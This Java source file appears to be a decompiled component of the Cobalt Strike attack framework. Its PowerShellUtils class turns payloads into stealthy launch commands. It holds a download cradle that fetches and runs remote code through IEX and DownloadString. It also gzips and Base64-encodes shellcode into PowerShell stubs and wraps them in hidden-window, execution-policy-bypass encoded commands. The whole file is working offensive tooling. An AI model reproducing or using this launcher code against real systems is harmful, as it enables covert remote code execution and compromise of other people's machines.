package common;

import aggressor.AggressorClient;
import common.CommonUtils;
import common.MudgeSanity;
import common.ResourceUtils;
import encoders.Base64;

import java.util.Stack;

import sleep.runtime.Scalar;
import sleep.runtime.SleepUtils;

public class PowerShellUtils {

    protected AggressorClient client;

    public PowerShellUtils(AggressorClient aggressorClient) {
        this.client = aggressorClient;
    }

    public String PowerShellDownloadCradle(String string) {
        Stack<Scalar> stack = new Stack();
        stack.push(SleepUtils.getScalar(string));
        String str = this.client.getScriptEngine().format("POWERSHELL_DOWNLOAD_CRADLE", stack);
        if (str == null) {
            return "IEX (New-Object Net.Webclient).DownloadString('" + string + "')";
        }
        return str;
    }

    public String PowerShellCompress(byte[] arrby) {
        Stack<Scalar> stack = new Stack();
        stack.push(SleepUtils.getScalar(arrby));
        String str = this.client.getScriptEngine().format("POWERSHELL_COMPRESS", stack);
        if (str == null) {
            String str1 = Base64.encode(CommonUtils.gzip(arrby));
            String str2 = CommonUtils.bString(
                    CommonUtils.readResource("resources/compress.ps1")).trim();
            str2 = CommonUtils.strrep(str2, "%%DATA%%", str1);
            CommonUtils.print_stat("PowerShell Compress (built-in). Original Size: "
                    + arrby.length + ", New Size: " + str2.length());
            return str2;
        }
        CommonUtils.print_stat("PowerShell Compress (scripted). Original Size: "
                + arrby.length + ", New Size: " + str.length());
        return str;
    }

    public String encodePowerShellCommand(byte[] arrby) {
        return encodePowerShellCommand(arrby, false);
    }

    public String encodePowerShellCommand(byte[] arrby, boolean bl) {
        try {
            byte[] shells = new ResourceUtils(this.client).buildPowerShell(arrby, bl);
            return CommonUtils.Base64PowerShell(PowerShellCompress(shells));
        } catch (Exception exception) {
            MudgeSanity.logException("encodePowerShellCommand", exception, false);
            return "";
        }
    }

    public byte[] buildPowerShellCommand(byte[] arrby, boolean bl) {
        byte[] shells = new ResourceUtils(this.client).buildPowerShell(arrby, bl);
        return CommonUtils.toBytes(format(PowerShellCompress(shells), true));
    }

    public byte[] buildPowerShellCommand(byte[] arrby) {
        return buildPowerShellCommand(arrby, false);
    }

    public String format(String string, boolean bl) {
        Stack<Scalar> stack = new Stack();
        stack.push(SleepUtils.getScalar(bl));
        stack.push(SleepUtils.getScalar(string));
        String str = this.client.getScriptEngine().format("POWERSHELL_COMMAND", stack);
        if (str == null) {
            return _format(string, bl);
        }
        return str;
    }

    public String _format(String string, boolean bl) {
        string = CommonUtils.Base64PowerShell(string);
        if (bl) {
            return "powershell -nop -w hidden -encodedcommand " + string;
        }
        return "powershell -nop -exec bypass -EncodedCommand " + string;
    }
}
